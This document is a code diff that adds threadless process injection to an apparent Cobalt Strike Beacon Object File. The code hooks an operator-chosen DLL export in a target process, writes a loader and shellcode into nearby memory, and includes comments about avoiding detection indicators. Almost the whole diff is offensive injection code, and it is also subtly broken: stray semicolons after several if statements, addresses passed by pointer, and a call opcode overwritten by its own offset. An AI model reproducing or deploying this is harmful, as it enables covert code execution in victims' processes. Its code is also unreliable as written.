@@ -53,11 +53,17 @@ UINT_PTR findMemoryHole(HANDLE hProcess, UINT_PTR pExportFunctionAddress, SIZE_T
 
 void go(char * buff, int len)
 {
-    HMODULE     hDll;
-    UINT_PTR    pExportFunctionAddress;
-    HANDLE      hProcess;
-    UINT_PTR    loaderAddress;
-    UINT_PTR    originalInstructions = 0;
+    HMODULE         hDll;
+    UINT_PTR        pExportFunctionAddress;
+    HANDLE          hProcess;
+    UINT_PTR        loaderAddress;
+    UINT_PTR        originalInstructions = NULL;
+    SIZE_T          protectSize = 8;
+    PDWORD          oldProtect = NULL;
+    UINT_PTR        relativeLoaderAddress;
+    unsigned char   callOpCode[] = { 0xe8, 0, 0, 0, 0 };
+    SIZE_T          bytesWritten = NULL;
+    SIZE_T          shellcodeRegion = NULL;
 
     datap parser;
     CHAR * shellcode;
@@ -71,6 +77,7 @@ void go(char * buff, int len)
     export = BeaconDataExtract(&parser, NULL);
     pid = BeaconDataExtract(&parser, NULL);
 
+    // get handle to operator's chosen dll
     hDll = GetModuleHandleA(dll);
     if (dll == NULL)
     {
@@ -78,6 +85,7 @@ void go(char * buff, int len)
         return;
     }
 
+    // get base address of operator's chosen export function
     pExportFunctionAddress = GetProcAddress(hDll, export);
     if (pExportFunctionAddress == NULL)
     {
@@ -87,6 +95,7 @@ void go(char * buff, int len)
 
     BeaconPrintf(CALLBACK_OUTPUT, "Found %s!%s at 0x%x", dll, export, pExportFunctionAddress);
 
+    // get handle to process of operator's choosing
     hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
     if (hProcess == NULL)
     {
@@ -96,7 +105,8 @@ void go(char * buff, int len)
 
     BeaconPrintf(CALLBACK_OUTPUT, "Opened Process with PID %s", pid);
 
-    UINT_PTR loaderAddress = findMemoryHole(hProcess, pExportFunctionAddress, sizeof(shellcodeLoader) + sizeof(shellcode));
+    // find the memory hole as shown in CCob's presentation, where the alignment of the assembly can occur in
+    loaderAddress = findMemoryHole(hProcess, pExportFunctionAddress, sizeof(shellcodeLoader) + sizeof(shellcode));
     if (loaderAddress == 0)
     {
         BeaconPrintf(CALLBACK_ERROR, "Failed to Find Memory Hole with 2G of Export Address. Error Code: %d", GetLastError());
@@ -109,4 +119,68 @@ void go(char * buff, int len)
     {
         ((CHAR*)&originalInstructions)[i] = ((CHAR*)pExportFunctionAddress)[i];
     }
+
+    // create the hook for threadless injection
+    GenerateHook(originalInstructions, shellcodeLoader);
+
+    // unfortunate RWX IOC as mentioned by CCob. TO-DO: try implementing VirtualProtect in the assembly stub?
+    if (!VirtualProtectEx(hProcess, &pExportFunctionAddress, &protectSize, PAGE_EXECUTE_READWRITE, &oldProtect));
+    {
+        BeaconPrintf(CALLBACK_ERROR, "RWX Protect Failed. Error Code: %d", GetLastError());
+    }
+
+    // create the call op code which will act as the jmp at the right offset
+    relativeLoaderAddress = loaderAddress - pExportFunctionAddress + 5;
+
+    for (int i = 0; i < sizeof(callOpCode); i++)
+    {
+        callOpCode[i] = ((unsigned char*)&relativeLoaderAddress)[i];
+    }
+
+    // write callOpCode to base address of export function
+    if (!WriteProcessMemory(hProcess, &pExportFunctionAddress, &callOpCode, sizeof(callOpCode), &bytesWritten));
+    {
+        BeaconPrintf(CALLBACK_ERROR, "OpCode WPM Failed. Error Code: %d", GetLastError());
+    }
+
+    // change assembly memory to RW, this happens later in CCob's write chain but needs to happen (i assume) to avoid an RWX payload write (IOC)
+    // calculate the size to fit everything, so protect will cover the entire payload
+    SIZE_T assemblySize = sizeof(shellcodeLoader) + sizeof(shellcode);
+
+    if (!VirtualProtectEx(hProcess, &loaderAddress, &assemblySize, PAGE_READWRITE, &oldProtect));
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Assembly RW Protect Failed. Error Code: %d", GetLastError());
+    }
+
+    // write loader + shellcode below call op code. C# makes this look easy in CCob's example, but chatGPT and other malware ppl confirm you need two mem writes which kinda sucks
+    // implement a check if a successful write occurs, compare to the size of the loader
+    if (WriteProcessMemory(hProcess, loaderAddress, shellcodeLoader, sizeof(shellcodeLoader), &bytesWritten));
+    {
+        if (bytesWritten != sizeof(shellcodeLoader))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Loader WPM Failed. Error Code: %d", GetLastError());
+        }
+    }
+
+    // write shellcode after recently written shellcode loader
+    shellcodeRegion = loaderAddress + sizeof(shellcodeLoader);
+
+    if (WriteProcessMemory(hProcess, shellcodeRegion, shellcode, sizeof(shellcode), &bytesWritten));
+    {
+        if (bytesWritten != sizeof(shellcode))
+        {
+            BeaconPrintf(CALLBACK_ERROR, "Shellcode WPM Failed. Error Code: %d", GetLastError());
+        }
+    }
+
+    // set protect back to RX, try to avoid oldProtect which is RWX
+    if (!VirtualProtectEx(hProcess, &loaderAddress, &assemblySize, PAGE_EXECUTE_READ, &oldProtect));
+    {
+        BeaconPrintf(CALLBACK_ERROR, "Assembly RX Protect Failed. Error Code: %d", GetLastError());
+    }
+
+    // dont want to wait like in CCob's original POC, just close the process handle and a beacon will return when the function is called
+    BeaconPrintf(CALLBACK_OUTPUT, "Threadless Injection complete! Your payload will be launched when the function of your choosing is called.");
+
+    CloseHandle(hProcess);
 }
